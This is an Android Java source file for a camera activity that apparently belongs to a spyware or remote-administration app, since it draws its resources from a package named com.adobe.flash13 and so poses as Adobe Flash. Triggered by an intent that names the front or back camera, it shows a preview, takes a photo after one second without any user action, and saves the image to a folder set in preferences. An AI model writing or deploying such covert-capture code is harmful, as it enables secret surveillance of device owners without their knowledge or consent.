package com.connect;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.AudioManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import com.adobe.flash13.R;


public class CameraView extends Activity implements SurfaceHolder.Callback {
        private static final String TAG = "CameraTest";
        Camera mCamera;
        boolean mPreviewRunning = false;

        @SuppressWarnings("deprecation")
		public void onCreate(Bundle icicle){
            super.onCreate(icicle);
            
            Log.e(TAG, "onCreate");

            setContentView(R.layout.cameraview);
            
            mSurfaceView = (SurfaceView) findViewById(R.id.surface_camera);
            mSurfaceHolder = mSurfaceView.getHolder();
            mSurfaceHolder.addCallback(this);
            mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        }

        @Override
        protected void onRestoreInstanceState(Bundle savedInstanceState){
            super.onRestoreInstanceState(savedInstanceState);
        }


        Camera.PictureCallback mPictureCallback = new Camera.PictureCallback() {

            public void onPictureTaken(byte[] data, Camera camera) {
                // TODO Auto-generated method stub
                if (data != null){

                    mCamera.stopPreview();
                    mPreviewRunning = false;                   
                    mCamera.release();

                     try{
                    	 System.gc();
                         Bitmap bmp = decodeFile(data);
                         System.gc();
                         
                         
                    	 saveBitmap(bmp);
                         System.gc();
                    	
                    	 Log.i("com.connect", "BITMAP SAVED");
                     }catch(Exception e){
                    	 e.printStackTrace();
                     }

                    finish();
                }       
            }
        };

        protected void onResume(){
            Log.e(TAG, "onResume");
            super.onResume();
        }

        protected void onSaveInstanceState(Bundle outState){
            super.onSaveInstanceState(outState);
        }

        protected void onStop(){
            Log.e(TAG, "onStop");
            super.onStop();
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
        }

		public void surfaceCreated(SurfaceHolder holder){
            Log.i("com.connect", "surfaceCreated");
                   
            Intent sender=getIntent();
            String cameraNumber = sender.getExtras().getString("Camera");
                        
                int cameraCount = 0; 
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo(); 
                cameraCount = Camera.getNumberOfCameras();
                for ( int camIdx = 0; camIdx < cameraCount; camIdx++ ) { 
                    Camera.getCameraInfo( camIdx, cameraInfo ); 
                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK && cameraNumber.equalsIgnoreCase("0")) { 
                        try { 
                        	Log.i("com.connect", "Back");
                            mCamera = Camera.open( camIdx ); 
                        } catch (RuntimeException e) { 
                        } 
                    }                    
                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT && cameraNumber.equalsIgnoreCase("1")) { 
                        try {
                        	Log.i("com.connect", "Front");
                            mCamera = Camera.open( camIdx ); 
                        } catch (RuntimeException e) { 
                        } 
                    }
                } 
            
        }

        public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
            Log.e(TAG, "surfaceChanged");

            // XXX stopPreview() will crash if preview is not running
            if (mPreviewRunning){
                mCamera.stopPreview();
            }

            Camera.Parameters p = mCamera.getParameters();
            
    	    List<Camera.Size> previewSizes = p.getSupportedPreviewSizes();

    	    Camera.Size previewSize = previewSizes.get(0);
    	    
    	    for(int i=0;i<previewSizes.size();i++)
    	    {
    	        if(previewSizes.get(i).width > previewSize.width)
    	        	previewSize = previewSizes.get(i);
//    	        Log.i("com.connect", "Size: " + previewSizes.get(i).width + ":" + previewSizes.get(i).height);
    	    }
    	    
            Log.i("com.connect", "Size: " + previewSize.width + ":" + previewSize.height);
            
            try{
            	
         Intent sender=getIntent();
         String cameraNumber = sender.getExtras().getString("Camera");
         
    	 System.gc();
    	 
	            p.setPictureFormat(PixelFormat.JPEG);
	            p.setJpegQuality(100);    	       
	    	    p.setPreviewSize(previewSize.width, previewSize.height); 

	    	    if (cameraNumber.equalsIgnoreCase("0")) 
	    	    { 
	    	    	p.setRotation(90);    	                           
                }                    
                if (cameraNumber.equalsIgnoreCase("1")) 
                { 
	    	    	p.setRotation(270);    	       
                   
                } 
  	        
	            p.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);    	        
	            mCamera.setParameters(p);  

            }
            catch (Exception e){
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            
            try{
                mCamera.setPreviewDisplay(holder);
            }catch (Exception e){
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            mCamera.startPreview();
            mPreviewRunning = true;
            
            final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
              @Override
              public void run() {
                  mCamera.takePicture(null, mPictureCallback, mPictureCallback);
              }
            }, 1000);
//            mCamera.takePicture(null, mPictureCallback, mPictureCallback);
        }

        public void surfaceDestroyed(SurfaceHolder holder) {
            Log.e("com.connect", "surfaceDestroyed");
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();

            //mCamera.stopPreview();
            //mPreviewRunning = false;
            //mCamera.release();
        }

        private SurfaceView mSurfaceView;
        private SurfaceHolder mSurfaceHolder;
        
        public void saveBitmap(Bitmap bm)
        {
            try
            {           	
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss");
                String currentDateandTime = sdf.format(new Date());

                String filename =currentDateandTime + ".jpg";
                File diretory = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures");
                diretory.mkdirs();
             	File outputFile = new File(diretory, filename);

                FileOutputStream stream = new FileOutputStream(outputFile.toString());
                bm.compress(CompressFormat.JPEG, 100, stream);
                stream.flush();
                stream.close();
                
            }
            catch(Exception e)
            {
                Log.e("Could not save", e.toString());
            }
        }
        
        private Bitmap decodeFile(byte[] buffer) {

            // Decode image size
            BitmapFactory.Options o = new BitmapFactory.Options();
            o.inJustDecodeBounds = true;
            BitmapFactory.decodeStream(new ByteArrayInputStream(buffer), null, o);

            // The new size we want to scale to
            final int REQUIRED_SIZE = 70;

            // Find the correct scale value. It should be the power of 2.
            int width_tmp = o.outWidth, height_tmp = o.outHeight;
            int scale = 1;
            while (true) {
                if (width_tmp / 2 < REQUIRED_SIZE || height_tmp / 2 < REQUIRED_SIZE)
                    break;
                width_tmp /= 2;
                height_tmp /= 2;
                scale *= 2;
            }

            // Decode with inSampleSize
            BitmapFactory.Options o2 = new BitmapFactory.Options();
            o2.inSampleSize = scale;
            return BitmapFactory.decodeStream(new ByteArrayInputStream(buffer),
                    null, o2);

        }

    }